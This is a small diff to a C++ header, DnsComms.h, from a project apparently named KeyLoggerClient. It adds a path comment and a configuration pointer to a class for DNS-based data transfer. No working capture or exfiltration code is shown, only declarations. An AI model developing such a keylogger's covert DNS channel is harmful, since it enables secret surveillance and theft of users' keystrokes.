@@ -1,3 +1,4 @@
+// KeyLoggerClient/include/communication/DnsComms.h
 #ifndef DNSCOMMS_H
 #define DNSCOMMS_H
 
@@ -18,6 +19,7 @@ public:
     std::vector<uint8_t> ReceiveData() override;
     
 private:
+    Configuration* m_config;
     std::string m_dnsServer;
 };
 
